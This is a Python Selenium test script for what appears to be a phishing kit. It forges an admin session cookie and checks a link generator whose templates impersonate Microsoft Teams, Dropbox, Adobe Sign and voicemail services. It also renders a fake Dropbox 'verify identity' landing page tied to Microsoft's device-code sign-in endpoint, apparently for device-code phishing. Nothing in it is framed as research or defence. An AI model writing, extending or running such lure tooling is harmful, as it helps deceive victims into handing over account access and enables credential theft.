import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from main import app
import time

s = app.session_interface.get_signing_serializer(app)
cookie_val = s.dumps({'authenticated': True, 'username': 'admin', 'role': 'admin'})

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--window-size=1440,960')

driver = webdriver.Chrome(options=chrome_options)
try:
    print("[1] Injecting session cookie...")
    driver.get("http://127.0.0.1:5000/favicon.ico")
    driver.add_cookie({"name": "session", "value": cookie_val, "path": "/"})

    print("[2] Navigating to Dashboard and showing Link Generator (Templates)...")
    driver.get("http://127.0.0.1:5000/dashboard")
    time.sleep(2)
    driver.execute_script("showPage('templates');")
    time.sleep(1.5)

    # Test PATH dynamic synchronization
    print("[3] Testing PATH dynamic synchronization...")
    
    # Check initial path
    init_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"Initial PATH: {init_path}")

    # Switch to Microsoft Teams
    driver.execute_script("""
        const sel = document.getElementById('lg-template-select');
        sel.value = 'Microsoft Teams';
        onTemplateSelectChange();
    """)
    time.sleep(0.5)
    teams_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"PATH after selecting 'Microsoft Teams': {teams_path}")
    assert teams_path == 'teams-invite', f"Expected 'teams-invite', got {teams_path}"

    # Switch to Dropbox
    driver.execute_script("""
        const sel = document.getElementById('lg-template-select');
        sel.value = 'Dropbox';
        onTemplateSelectChange();
    """)
    time.sleep(0.5)
    dropbox_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"PATH after selecting 'Dropbox': {dropbox_path}")
    assert dropbox_path == 'dropbox-share', f"Expected 'dropbox-share', got {dropbox_path}"

    # Click randomize dice button
    driver.execute_script("randomizePath();")
    time.sleep(0.5)
    rand_dropbox_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"PATH after clicking randomize dice (Dropbox): {rand_dropbox_path}")
    assert not any(c.isdigit() for c in rand_dropbox_path), f"Path should not contain numbers: {rand_dropbox_path}"
    assert rand_dropbox_path.startswith('dropbox-'), f"Path should start with dropbox-: {rand_dropbox_path}"

    # Switch to Adobe
    driver.execute_script("""
        const sel = document.getElementById('lg-template-select');
        sel.value = 'Adobe';
        onTemplateSelectChange();
    """)
    time.sleep(0.5)
    adobe_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"PATH after selecting 'Adobe': {adobe_path}")
    assert adobe_path == 'adobe-sign', f"Expected 'adobe-sign', got {adobe_path}"

    # Switch to Cloud Voicemail
    driver.execute_script("""
        const sel = document.getElementById('lg-template-select');
        sel.value = 'Cloud Voicemail';
        onTemplateSelectChange();
    """)
    time.sleep(0.5)
    vmail_path = driver.execute_script("return document.getElementById('lg-path').value;")
    print(f"PATH after selecting 'Cloud Voicemail': {vmail_path}")
    assert vmail_path == 'voice-portal', f"Expected 'voice-portal', got {vmail_path}"

    # Switch back to Dropbox to capture screenshot
    driver.execute_script("""
        const sel = document.getElementById('lg-template-select');
        sel.value = 'Dropbox';
        onTemplateSelectChange();
    """)
    time.sleep(0.5)
    os.makedirs("scratch", exist_ok=True)
    driver.save_screenshot("scratch/verify_path_dynamic_slugs.png")
    print("Saved scratch/verify_path_dynamic_slugs.png")

    # Now test the Landing Page Verifying Identity state
    print("[4] Testing Landing Page 'Verifying Identity' overlay...")
    from deployments import render_landing_dropbox
    cfg = {
        'template_name': 'Dropbox',
        'landing_title': 'Shared folder access',
        'landing_desc': 'Verify identity to view shared files.',
        'doc_name': 'Project-Q4-Deliverables.pdf',
        'show_left_panel': True
    }
    landing_html = render_landing_dropbox(cfg, 'TEST-9988', 'https://login.microsoftonline.com/common/oauth2/deviceauth', success_url='https://example.com/success')
    with open('scratch/temp_landing_test.html', 'w', encoding='utf-8') as f:
        f.write(landing_html)

    abs_path = os.path.abspath('scratch/temp_landing_test.html').replace('\\', '/')
    driver.get(f"file:///{abs_path}")
    time.sleep(1)

    # Click the sign-in button
    signin_btn = driver.find_element(By.CSS_SELECTOR, ".signin-btn")
    assert signin_btn is not None
    driver.execute_script("arguments[0].click();", signin_btn)
    time.sleep(1)

    # Check that #verifying-overlay is now visible and card content is hidden
    overlay_display = driver.execute_script("return window.getComputedStyle(document.getElementById('verifying-overlay')).display;")
    content_display = driver.execute_script("return window.getComputedStyle(document.getElementById('card-content-wrap')).display;")
    print(f"Overlay display: {overlay_display}, Content wrap display: {content_display}")
    assert overlay_display == 'flex', f"Expected overlay display 'flex', got '{overlay_display}'"
    assert content_display == 'none', f"Expected content display 'none', got '{content_display}'"

    driver.save_screenshot("scratch/verify_landing_verifying_state.png")
    print("Saved scratch/verify_landing_verifying_state.png")

    print("ALL TESTS PASSED SUCCESSFULLY!")

finally:
    driver.quit()
